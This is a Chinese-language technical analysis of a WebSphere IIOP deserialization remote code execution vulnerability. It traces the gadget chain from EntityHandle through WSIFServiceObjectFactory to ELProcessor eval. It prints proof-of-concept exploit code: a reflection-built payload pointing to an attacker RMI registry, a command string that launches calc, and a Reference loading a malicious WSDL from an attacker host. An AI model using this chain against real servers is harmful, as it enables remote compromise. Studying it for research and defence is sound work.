由于我们选择利用这里的`handle.getEJBObject()`方法，所以需要找到一个实现了Handle接口的类，最终找到了com.ibm.ejs.container.EntityHandle这个类
在谈到EntityHandle这个类之前我们先看下EntityHandle的getEJBObject方法，以下是该方法中的部分代码
    public EJBObject getEJBObject() throws RemoteException {
    ......
    //此处的this.homeJNDIName和homeClass皆为我们可控
                    home = (EJBHome)PortableRemoteObject.narrow(ctx.lookup(this.homeJNDIName), homeClass);
                } catch (NoInitialContextException var7) {
                    Properties p = new Properties();
                    p.put("java.naming.factory.initial", "com.ibm.websphere.naming.WsnInitialContextFactory");
                    ctx = new InitialContext(p);
                    home = (EJBHome)PortableRemoteObject.narrow(ctx.lookup(this.homeJNDIName), homeClass);
                }
                Method fbpk = this.findFindByPrimaryKey(homeClass);
                this.object = (EJBObject)fbpk.invoke(home, this.key);
            } catch (InvocationTargetException var10) {
    ......
    }
首先我们已知this.homeJNDIName是我们可控的，那么就意味着我们可以指定WebSphere去lookup一个指定rmi或者ldap服务器，我们在服务器上可以放一个RMI
Reference 来让WebSphere进行加载。
生成一个可利用EntityHandle的对象需要通过一系列比较复杂的反射，根据Iswin大佬提供的思路，代码如下
    WSIFPort_EJB wsifPort_ejb = new WSIFPort_EJB(null,null,null);
    Field fieldEjbObject = wsifPort_ejb.getClass().getDeclaredField("fieldEjbObject");
    fieldEjbObject.setAccessible(true);
    fieldEjbObject.set(wsifPort_ejb,new EJSWrapper(){
        @Override
        public Handle getHandle() throws RemoteException {
            Handle var2 = null;
            try {
                SessionHome sessionHome = new SessionHome();
                J2EEName j2EEName = new J2EENameImpl("iswin",null,null);
                Field j2eeName = EJSHome.class.getDeclaredField("j2eeName");
                j2eeName.setAccessible(true);
                j2eeName.set(sessionHome,j2EEName);
                Field jndiName = EJSHome.class.getDeclaredField("jndiName");
                jndiName.setAccessible(true);
                //jndiName.set(sessionHome,System.getProperty("rmi_backedn"));
                jndiName.set(sessionHome,"rmi://172.16.45.1:1097/Object");
                BeanId beanId = new BeanId(sessionHome,"\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()\")");
                Properties initProperties = new Properties();
                initProperties.setProperty("java.naming.factory.object","org.apache.wsif.naming.WSIFServiceObjectFactory");
                Constructor entiyHandleConstructor = EntityHandle.class.getDeclaredConstructor(BeanId.class,BeanMetaData.class,Properties.class);
                entiyHandleConstructor.setAccessible(true);
                BeanMetaData beanMetaData = new BeanMetaData(1);
                beanMetaData.homeInterfaceClass = com.ibm.ws.batch.CounterHome.class;
                var2 = (Handle)entiyHandleConstructor.newInstance(beanId,beanMetaData,initProperties);
            }catch (Exception e){
                e.printStackTrace();
            }
            return var2;
        }
    });
之所以这样写是因为WSIFPort_EJB对象在序列化时会调用自身的fieldEjbObject属性的getHandle方法，并将其返回值进行序列化，所以我们通过反射为fieldEjbObject属性赋值一个EJSWrapper对象，并重写其getHandle方法，在getHandle通过反射实例化EntityHandle对象。
回到EntityHandle的getEJBObject方法中，跟进ctx.lookup(this.homeJNDIName)
跟到ObjectFactoryHelper的getObjectInstanceViaContextDotObjectFactories方法里的时候可以看到
这里看到environment参数是我们可控的，所以在该方法中可以调用我们指定的factory的getObjectInstance方法，可以看到这里的值是在我们在EntityHandle实例化的时候作为参数传递进去了
我们传递进去的值是 `org.apache.wsif.naming.WSIFServiceObjectFactory`
所以会调用WSIFServiceObjectFactory类的getObjectInstance方法
我们来看一下该方法的部分代码，这里会对look加载的Reference的信息进行解析，并挨个Reference中的值取出。
    public Object getObjectInstance(Object obj, Name name, Context context, Hashtable env) throws Exception {
        Trc.entry(this, obj, name, context, env);
        if (obj instanceof Reference && obj != null) {
    ......
                }
            } else if (ref.getClassName().equals(WSIFServiceStubRef.class.getName())) {
                wsdlLoc = this.resolveString(ref.get("wsdlLoc"));
                serviceNS = this.resolveString(ref.get("serviceNS"));
                serviceName = this.resolveString(ref.get("serviceName"));
                portTypeNS = this.resolveString(ref.get("portTypeNS"));
                portTypeName = this.resolveString(ref.get("portTypeName"));
                String preferredPort = this.resolveString(ref.get("preferredPort"));
                String className = this.resolveString(ref.get("className"));
                if (wsdlLoc != null) {
                    WSIFServiceFactory factory = WSIFServiceFactory.newInstance();
                    WSIFService service = factory.getService(wsdlLoc, serviceNS, serviceName, portTypeNS, portTypeName);
                    Class iface = Class.forName(className, true, Thread.currentThread().getContextClassLoader());
                    Object stub = service.getStub(preferredPort, iface);
                    Trc.exit(stub);
                    return stub;
                }
            }
        }
        Trc.exit();
        return null;
    }
来看一下Reference中的代码。
    Registry registry = LocateRegistry.createRegistry(1097);
    Reference reference = new Reference(WSIFServiceStubRef.class.getName(),(String) null,(String) null);
    reference.add(new StringRefAddr("wsdlLoc","http://172.16.45.1:8000/poc.xml"));
    reference.add(new StringRefAddr("serviceNS","http://www.ibm.com/namespace/wsif/samples/ab"));
    reference.add(new StringRefAddr("serviceName","rce_service"));
    reference.add(new StringRefAddr("portTypeNS","http://www.ibm.com/namespace/wsif/samples/ab"));
    reference.add(new StringRefAddr("portTypeName","RceServicePT"));
    reference.add(new StringRefAddr("preferredPort","JavaPort"));
    reference.add(new StringRefAddr("className","com.ibm.ws.batch.CounterHome"));
    ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
    registry.bind("Object",referenceWrapper);
这里先要注意到的一点就是最后有一个`reference.add(new
StringRefAddr("className","com.ibm.ws.batch.CounterHome"))`这里牵扯到最终该getObjectInstance函数返回值的类型问题，之前在看EntityHandle的getEJBObject方法时,narrow方法的返回值其实就是ctx.lookup(this.homeJNDIName)的返回值，也就是说ctx.lookup(this.homeJNDIName)返回值的类型是要实现自EJBHome接口
    home = (EJBHome)PortableRemoteObject.narrow(ctx.lookup(this.homeJNDIName), homeClass);
WSIFServiceObjectFactory的getObjectInstance方法的返回值是一个Proxy类型，而该Proxy类型在创建时传入的接口参数就是Reference中的`new
StringRefAddr("className","com.ibm.ws.batch.CounterHome")`，之所以选择CounterHome作为返回的Proxy对象的接口，CounterHome继承了EJBHome是一个原因，还有一个原因就是该接口中声明了接下来要用到了findFindByPrimaryKey方法
讲完了为何选择CounterHome作为返回Proxy对象的接口，接下来getObjectInstance方法中还有这么一段代码
    WSIFService service = factory.getService(wsdlLoc, serviceNS, serviceName, portTypeNS, portTypeName);
这里会根据解析的Reference中的wsdlLoc字段的值也就是去该地址加载制定的xml文件，这个poc.xml就是一个WSDL文件内容如下，关于此WSDL文件的构造可以参考此篇文章
可以看到Reference中的serviceName，portTypeName，preferredPort等字段的值都可以在这个xml中找到。
最终加载解析完成后会返回一个WSIFServiceImpl类型的值。getObjectInstance执行完成后会根据该WSIFServiceImpl对象生成一个对应的Proxy对象，也就前面提到的实现接口为CounterHome的那个proxy对象。
WSIFServiceObjectFactory的getObjectInstance方法执行完成后返回至EntityHandle的getEJBObject方法中，接下来会执行这里会查询homeClass中是否有个方法名叫findFindByPrimaryKey的方法，如果有的话返回该方法的Method对象，如果没有则返回空，该homeClass变量里的值是我们可控的，在IIOP客户端生成EntityHandle对象时就已经封装好了，其值为com.ibm.ws.batch.CounterHome所以执行结果时返回findFindByPrimaryKey方法的Method对像。
    Method fbpk = this.findFindByPrimaryKey(homeClass)
接下来就会执行最关键的一步也就是
    this.object = (EJBObject)fbpk.invoke(home, this.key)
接下来就会执行到WSIFClientProxy的Invoke方法中然后跟踪到WSIFOperation_Java的executeRequestResponseOperation方法中，该方法中有这么一行代码
    result = this.fieldMethods[a].invoke(objRef, compatibleArguments);
可以看到这里就通过放反射的方法调用javax.el.ELProcessor的eval方法了，并将我们我们想要执行的代码传递了进去。至此CVE-2020-445反序列化远程代码执行漏洞分析完毕。
## 总结
此次漏洞确实稍显复杂，但是思路其实还是挺清晰的，首先是通过构造发送的数据，让WebSphere先执行到反序列化的点，然后由于IBM JAVA
SDK本身的限制，没办法使用RMI Reference或者LDAP Reference 远程加载Class到本地来执行恶意代码的方式了所以
需要从本地找到一个实现了ObjectFactory的类，并且该类在getObjectInstance方法中进行了有风险的操作，这里可以参考Michael
Stepankin大佬的这篇文章。所以找到了WSIFServiceObjectFactory，该类解析了Reference并根据Reference中的值去加载和解析我们事先准备好的一个恶意WSDL文件。最终WebSphere根据WSIFServiceObjectFactory的getObjectInstance方法的返回值通过反射的方式调用了javax.el.ELProcessor的eval方法了最终执行了我们的恶意代码。
## 参考
* * *